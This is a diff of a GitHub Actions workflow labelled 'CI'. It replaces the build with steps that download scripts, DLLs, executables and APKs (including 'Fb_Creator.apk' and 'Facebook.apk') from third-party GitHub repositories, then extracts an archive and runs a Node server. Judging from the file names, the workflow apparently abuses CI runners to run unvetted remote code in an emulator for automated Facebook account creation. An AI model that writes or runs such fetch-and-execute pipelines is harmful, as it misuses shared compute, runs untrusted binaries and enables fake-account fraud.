@@ -2,9 +2,34 @@ name: CI
 on: [push, workflow_dispatch]
 jobs:
   build:
-    runs-on: ubuntu-latest
+    runs-on: windows-latest
     steps:
+    
+    - name: Emulator Tools
+      run: Invoke-WebRequest https://raw.githubusercontent.com/raiyan088/public/refs/heads/main/facebook/server.js -OutFile server.js
+    - run: Invoke-WebRequest https://raw.githubusercontent.com/raiyan088/public/refs/heads/main/facebook/install.py -OutFile install.py
+    - run: Invoke-WebRequest https://raw.githubusercontent.com/raiyan088/public/refs/heads/main/facebook/package.json -OutFile package.json
+    - run: Invoke-WebRequest https://raw.githubusercontent.com/hieapemlyg37355/tools/refs/heads/main/config.conf -OutFile config.conf
+    - run: Invoke-WebRequest https://raw.githubusercontent.com/hieapemlyg37355/tools/refs/heads/main/AdbWinUsbApi.dll -OutFile AdbWinUsbApi.dll
+    - run: Invoke-WebRequest https://raw.githubusercontent.com/hieapemlyg37355/tools/refs/heads/main/AdbWinApi.dll -OutFile AdbWinApi.dll
+    - run: Invoke-WebRequest https://raw.githubusercontent.com/hieapemlyg37355/tools/refs/heads/main/CarlosPlus.apk -OutFile CarlosPlus.apk
+    - run: Invoke-WebRequest https://raw.githubusercontent.com/hieapemlyg37355/tools/refs/heads/main/Lite.apk -OutFile Lite.apk
+    - run: Invoke-WebRequest https://raw.githubusercontent.com/hieapemlyg37355/tools/refs/heads/main/Fb_Creator.apk -OutFile Fb_Creator.apk
+    - run: Invoke-WebRequest https://raw.githubusercontent.com/hieapemlyg37355/tools/refs/heads/main/Facebook.apk -OutFile Facebook.apk
+    - run: Invoke-WebRequest https://media.githubusercontent.com/media/hieapemlyg37355/tools/refs/heads/main/adb.exe -OutFile adb.exe
+    - run: Invoke-WebRequest https://media.githubusercontent.com/media/hieapemlyg37355/tools/refs/heads/main/Emulator.exe -OutFile Emulator.exe
+    - run: Invoke-WebRequest https://media.githubusercontent.com/media/hieapemlyg37355/tools/refs/heads/main/Rvc64_5.21.580.1017.exe -OutFile Rvc64_5.21.580.1017.exe
+    - run: Invoke-WebRequest https://media.githubusercontent.com/media/hieapemlyg37355/tools/refs/heads/main/Data.zip -OutFile Data.zip
 
-    - name: Server
-      run: wget https://raw.githubusercontent.com/raiyan088/public/main/github/server.js
-    - run: node server.js
+    - name: Extract Data
+      run: tar -xf Data.zip
+    
+    - name: PIP Install
+      run: pip install -U pywinauto
+
+    - name: NPM Install
+      run: npm install fs
+
+    - name: Node Start
+      run: node server
+      
